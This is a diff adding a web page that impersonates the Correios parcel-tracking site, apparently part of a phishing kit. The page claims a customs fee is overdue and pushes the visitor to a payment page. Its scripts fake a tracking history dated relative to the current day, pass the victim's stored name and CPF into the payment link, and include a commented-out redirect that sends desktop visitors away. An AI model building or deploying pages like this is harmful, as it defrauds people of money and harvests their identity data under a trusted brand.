@@ -1,0 +1,544 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Rastreamento</title>
+
+    <link rel="shortcut icon" href="images/favi-ect.png">
+
+    <!-- <link href="css/fontawesome.css" rel="stylesheet"> -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/custom.css" rel="stylesheet ">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer">
+
+</head>
+
+<body class="">
+
+
+  <section id="acessibilidade">
+    <a tabindex="1">Acessibilidade</a>        
+  </section>
+
+  <section id="menu">
+    <a class="hamburger" tabindex="1"></a>
+    <a class="logo" href="#0"></a>
+    <a class="pesquisar"></a>
+    <a class="entrar" href="#0"></a>
+  </section>
+
+
+  <main>
+    <input type="hidden" id="documento" name="documento" value="">
+
+    <div class="container">
+      <nav aria-label="breadcrumb">
+       <div id="trilha">
+        Portal Correios <span><i class="fa fa-angle-right mx-2" aria-hidden="true"></i></span> Rastreamento 
+       </div>
+     </nav>
+
+     <div id="resultado">
+
+     </div>
+
+
+     <form>
+      <div class="">
+        <div class="campos">
+          <div class="campo">
+            <div class="rotulo">
+              <h3 style="text-align: justify; font-size: 150%; font-weight: bold;">STATUS DO PEDIDO:</h3>
+              <div class="">
+                <div class="campos">
+                  <div class="campo">
+                    <div class="rotulo mt-3">
+                      <span class="bolinha-piscando"></span>
+                      <h3 style="font-size: 120%; font-weight: bold; color: #FABB00;">
+                        AGUARDANDO PAGAMENTO (NL704949350BR)
+                      </h3>
+                    </div>
+                    <p class="text-start mt-3 text-dark" style="font-size: 1.4rem;">Olá, <b style="color: #010101;" class="nome-cpf"></b></p>
+
+                  </div>
+                </div>
+
+                <div class="campos">
+                  <div class="campo">
+                    <div class="rotulo">
+                      <p>
+                        Seu pedido passou por um processo na alfândega e foi taxado.
+                      </p><div class="barcode-section">
+                        <img src="images/1.png" alt="Etiqueta Correios" class="barcode-image">
+                        <div id="recipientName" class="nome-cpf nome-pacote"></div>
+                      </div>
+                      Por gentileza, soliticitamos a realização do pagamento da taxa, para que, consecutivamente, possamos dar prosseguimento ao envio do seu produto, no prazo de 3 dias úteis.
+                      <br> <br>
+                      O pagamento deve ser feito clicando no botão abaixo:
+                      <p></p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>  
+
+
+
+            <div class="e-flex e-con-boxed e-con e-parent">
+              <div class="e-con-inner">
+
+
+                <a id="payment-btn" href="pagamentod7c0.html" class="w-100">
+                  <span style="color: #fff;">CLIQUE AQUI PARA EFETUAR O PAGAMENTO</span>
+                </a>
+                
+
+
+              </div>
+              <h3 style="font-size: 100%; font-weight: bold; margin-top: 1.4rem">
+                PRAZO DE ENTREGA APÓS O PAGAMENTO: 3 DIAS ÚTEIS
+              </h3>
+
+            </div>
+          </div>
+        </div>
+      </div>
+    </form>
+  </div>
+  <script>
+    window.addEventListener("DOMContentLoaded", () => {
+        const nome = localStorage.getItem("nomeConsulta");
+    
+        if (nome) {
+            // Insere o nome nos elementos com classe .nome-cpf
+            const elementosNome = document.querySelectorAll(".nome-cpf");
+            elementosNome.forEach(el => el.textContent = nome);
+        } else {
+            alert("Nome não encontrado. Retorne e digite o CPF novamente.");
+            window.location.href = "index.html"; // Redireciona para página principal
+        }
+    });
+    </script>
+    
+  <br>
+
+  <div id="tabs-rastreamento">
+    <div id="ver-rastro-unico">
+      <div id="cabecalho-rastro" class="d-flex justify-content-between">
+        <ul class="cabecalho-rastro">
+
+          <div class="arrow-dashed justify-content-start">
+            <div class="circle">
+              <img class="circle-img" src="images/correios-sf.png" width="35px" height="35px">
+            </div>
+          </div>      
+          <div class="cabecalho-content">
+            <p class="text text-content">PRIME EXPRESS</p>
+          </div>
+        </ul>
+
+        <div class="share-bar noPrint">
+          <a title="Compartilhar" class="btn btn-light" data-objeto="LV991490411CN">
+            <i class="fa fa-share-alt" aria-hidden="true"></i>
+          </a>
+        </div>
+      </div>
+      <ul class="ship-steps">
+        <li class="step">
+          <div class="arrow-current">
+            <div class="circle">
+              <img class="circle-img" src="images/aguardando-pagamento.png">
+            </div>
+          </div>
+          <div class="step-content">
+            <p class="text text-head">Última tentativa de regularização do pedido - Redução de valor aplicada </p>
+            <p class="text text-content">São Paulo - SP</p>
+            <p class="text text-content" id="etapa-final" >07/01/2025 05:40</p>
+
+          </div>
+        </li>
+        <li class="step">
+          <div class="arrow-current">
+            <div class="circle">
+              <img class="circle-img" src="images/caminhao-cor.png">
+            </div>
+          </div>
+          <div class="step-content">
+            <p class="text text-head">Devolução ao fornecedor - não aceita pelo fornecedor</p>
+            <p class="text text-content">São Paulo - SP</p>
+            <p class="text text-content" id="etapa-05" style="display: none;">21/12/2024 15:37</p>
+          </div>
+        </li>
+
+        <li class="step">
+          <div class="arrow-current">
+            <div class="circle">
+              <img class="circle-img" src="images/aguardando-pagamento.png">
+            </div>
+          </div>
+          <div class="step-content">
+            <p class="text text-head">Fiscalização aduaneira concluída - pagamento não efetuado pelo destinatário</p>
+            <p class="text text-content">São Paulo - SP</p>
+            <p class="text text-content" id="etapa-04" style="display: none;">09/12/2024 05:40</p>
+          </div>
+        </li>
+
+        <li class="step">
+          <div class="arrow-current">
+            <div class="circle">
+              <img class="circle-img" src="images/brazil.png">
+            </div>
+          </div>
+          <div class="step-content">
+            <p class="text text-head">Objeto recebido pelos Correios do Brasil</p>
+            <p class="text text-content">São Paulo - SP</p>
+            <p class="text text-content" id="etapa-03" style="display: none;">02/12/2024 07:45</p>
+          </div>
+        </li>
+        <li class="step">
+          <div class="arrow-current">
+            <div class="circle">
+              <img class="circle-img" src="images/caminhao-cor.png">
+            </div>
+          </div>
+          <div class="step-content">
+            <p class="text text-head">Objeto em transferência - por favor aguarde</p>
+            <p class="text text-content"> para Unidade de Tratamento Internacional - BR</p>
+            <p class="text text-content">CHINA</p>
+            <p class="text text-content" id="etapa-02" style="display: none;">29/11/2024 22:29</p>
+          </div>
+        </li>
+        <li class="step"><div class="arrow-none">
+          <div class="circle">
+            <img class="circle-img" src="images/agencia-cor.png">
+          </div>
+        </div>
+        <div class="step-content">
+          <p class="text text-head">Objeto postado</p>
+          <p class="text text-content">CHINA</p>
+          <p class="text text-content" id="etapa-01" style="display: none;">25/11/2024 19:38</p>
+        </div>
+      </li>
+    </ul>
+  </div>
+</div>
+
+
+<script>
+  $(document).ready(function () {
+
+    // Obter a data atual
+    const dataAtual = new Date();
+
+    // Configurar os dias de diferença para cada etapa
+    const etapas = [
+      { id: "#etapa-01", dias: -30 },
+      { id: "#etapa-02", dias: -20 },
+      { id: "#etapa-03", dias: -17 },
+      { id: "#etapa-04", dias: -13 },
+      { id: "#etapa-05", dias: -8 },
+      { id: "#etapa-final", dias: 0 },
+    ];
+
+   // Lista de horários fixos (HH:mm)
+    const horariosFixos = [
+      { horas: 7, minutos: 42 },
+      { horas: 13, minutos: 22 },
+      { horas: 8, minutos: 40 },
+      { horas: 9, minutos: 54 },
+      { horas: 16, minutos: 37 },
+      { horas: 10, minutos: 20 }
+    ];
+
+// Função para calcular uma nova data com base nos dias de diferença
+    function calcularData(baseDate, dias, isFinal) {
+      const novaData = new Date(baseDate);
+
+  // Ajustar a data conforme o número de dias
+      novaData.setDate(novaData.getDate() + dias);
+
+      if (isFinal) {
+    // Horário fixo para a data atual
+        const horarioAtual = new Date(baseDate);
+        const limiteHorario = new Date(baseDate);
+        limiteHorario.setHours(5, 42, 0, 0);
+
+        if (horarioAtual < limiteHorario) {
+      // Antes das 05:42, definir para o dia anterior às 05:42
+          novaData.setDate(novaData.getDate() - 1);
+        }
+
+    // Ajustar horário para 05:42
+        novaData.setHours(5, 42, 0, 0);
+      } else {
+    // Garantir que o índice está dentro do intervalo da lista
+        const index = Math.abs(dias) % horariosFixos.length;
+
+    // Definir horário fixo baseado no índice
+        const horarioFixo = horariosFixos[index];
+        novaData.setHours(horarioFixo.horas, horarioFixo.minutos);
+      }
+
+  // Formatar a data (DD/MM/YYYY HH:mm)
+      const dia = String(novaData.getDate()).padStart(2, '0');
+      const mes = String(novaData.getMonth() + 1).padStart(2, '0');
+      const ano = novaData.getFullYear();
+      const horasFormatadas = String(novaData.getHours()).padStart(2, '0');
+      const minutosFormatados = String(novaData.getMinutes()).padStart(2, '0');
+
+      return `${dia}/${mes}/${ano} ${horasFormatadas}:${minutosFormatados}`;
+    }
+
+    // Atualizar as datas nos elementos HTML
+    etapas.forEach(etapa => {
+      const isFinal = etapa.dias === 0; // Verificar se é a etapa final
+      const novaData = calcularData(dataAtual, etapa.dias, isFinal);
+      $(etapa.id).text(novaData);
+    });
+  });
+</script>
+
+
+
+</main>
+
+
+<footer id="rodape">
+  <div class="recipiente largura-maxima">
+
+    <div class="rodape-links">
+      <h2>Fale Conosco</h2>
+
+      <ul class="lista-icone">
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-monitor.png">
+            <span>Registro de Manifestações</span>
+          </a>
+        </li>
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-duvida.png">
+            <span>Central de Atendimento</span>
+          </a>
+        </li>
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-negocios.png">
+            <span>Soluções para o seu negócio</span>
+          </a>
+        </li>
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-headset.png">
+            <span>Suporte ao cliente com contrato</span>
+          </a>
+        </li>
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-ouvidoria.png">
+            <span>Ouvidoria</span>
+          </a>
+        </li>
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-denuncia.png">
+            <span>Denúncia</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="rodape-links">
+      <h2>Sobre os Correios</h2>
+
+      <ul class="lista-icone">
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-identidade.png">
+            <span>Identidade corporativa</span>
+          </a>
+        </li>
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-educacao.png">
+            <span>Educação e cultura</span>
+          </a>
+        </li>
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-codigo-etica.png">
+            <span>Código de ética</span>
+          </a>
+        </li>
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-transparencia.png">
+            <span>Transparência e prestação de contas</span>
+          </a>
+        </li>
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-cadeado.png">
+            <span>Política de Privacidade e Notas Legais</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="rodape-links">
+      <h2>Outros Sites</h2>
+
+      <ul class="lista-icone">
+        <li>
+          <a href="#0">
+            <img class="icones-link" src="images/rodape-loja-correios.png">
+            <span>Loja online dos Correios</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+
+  </div>
+  <p>
+  </p><div class="copyright">© Copyright 2025 Correios</div>
+  <p></p>
+</footer>
+
+
+
+<!-- Popup Overlay -->
+<div class="custom-overlay" id="customPopupOverlay">
+  <div class="custom-popup">    
+    <img src="images/popup.webp" alt="Popup Image">
+    <button class="custom-close-btn" id="closePopupBtn">×</button>
+  </div>
+</div>
+
+
+
+<script>
+  // Função para obter parâmetro da URL
+  function getParameterByName(name, url = window.location.href) {
+    name = name.replace(/[\[\]]/g, '\\$&');
+    const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+    const results = regex.exec(url);
+    if (!results) return null;
+    if (!results[2]) return '';
+    return decodeURIComponent(results[2].replace(/\+/g, ' '));
+  }
+
+  // Gera e-mail aleatório
+  function gerarEmailAleatorio() {
+    const dominios = ['gmail.com', 'yahoo.com', 'outlook.com'];
+    const nome = Math.random().toString(36).substring(2, 10);
+    const dominio = dominios[Math.floor(Math.random() * dominios.length)];
+    return `${nome}@${dominio}`;
+  }
+
+  // Gera telefone aleatório
+  function gerarTelefoneAleatorio() {
+    const ddd = Math.floor(Math.random() * 90 + 10);
+    const numero = Math.floor(Math.random() * 900000000 + 100000000);
+    return `(${ddd}) ${numero.toString().slice(0, 5)}-${numero.toString().slice(5)}`;
+  }
+
+  $(document).ready(function () {
+    // Obter o nome e CPF do localStorage (que foram salvos na página index.html)
+    const nome = localStorage.getItem("nomeConsulta") || 'Cliente';
+    const cpf = localStorage.getItem("cpfConsulta") || '22950309003';
+    
+    // Obter parâmetros da URL
+    let urlParams = new URLSearchParams(window.location.search);
+    let codParam = urlParams.get('cod') || '';
+
+    // Atualizar o nome na página
+    $('.nome-cpf').text(nome);
+
+    // Gerar apenas email e telefone aleatórios
+    const email = gerarEmailAleatorio();
+    const telefone = gerarTelefoneAleatorio();
+
+    // Construir a URL com os dados corretos
+    const newUrl = 'pagamentod7c0.html?' +
+      'telefone=' + encodeURIComponent(telefone) +
+      '&cpf=' + encodeURIComponent(cpf) +
+      '&nome=' + encodeURIComponent(nome) +
+      '&email=' + encodeURIComponent(email) +
+      '&cod=' + encodeURIComponent(codParam);
+
+    const paymentBtn = document.getElementById('payment-btn');
+    if (paymentBtn) {
+      paymentBtn.href = newUrl;
+      console.log("✅ Redirecionando para:", newUrl);
+    }
+
+    $('.loading-progress').fadeOut();
+  });
+</script>
+
+
+<script>
+
+  // Atualiza a data e hora
+  function atualizarData() {
+    const agora = new Date();
+
+    // Formatar a data
+    const dia = String(agora.getDate()).padStart(2, '0');
+    const mes = String(agora.getMonth() + 1).padStart(2, '0');
+    const ano = agora.getFullYear();
+
+    // Horário fixo
+    const horarioFixo = "05:40";
+
+    // Atualiza o elemento com o ID "data-hora"
+    $("#data-hora").text(`${dia}/${mes}/${ano} ${horarioFixo}`);
+  }
+
+  // Atualiza a data ao carregar a página
+  $(document).ready(function () {
+    atualizarData();
+
+    // $('#customPopupOverlay').show();
+
+    // Fecha o popup ao clicar fora ou no botão de fechar
+    $("#customPopupOverlay").on("click", function (event) {
+      const popup = $(".custom-popup");
+
+      // Se o clique for no overlay ou no botão de fechar, fecha o popup
+      if ($(event.target).is("#customPopupOverlay") || $(event.target).is("#closePopupBtn")) {
+        $("#customPopupOverlay").hide(); // Oculta o overlay
+      }
+    });
+
+    // Impede o comportamento padrão e a propagação do botão de fechar
+    $("#closePopupBtn").on("click", function (event) {
+      event.preventDefault(); // Evita recarregar a página
+      event.stopPropagation(); // Impede a propagação do evento
+      $("#customPopupOverlay").hide(); // Fecha o popup
+    });
+  });
+</script>
+
+
+
+<script src="js/bootstrap.js"></script>
+<script src="js/bootstrap.bundle.min.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+
+<!-- <script type="text/javascript">
+
+if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+window.location.href = '/404';
+}
+</script>  --> 
+
+</body>
+
+</html>
+
+
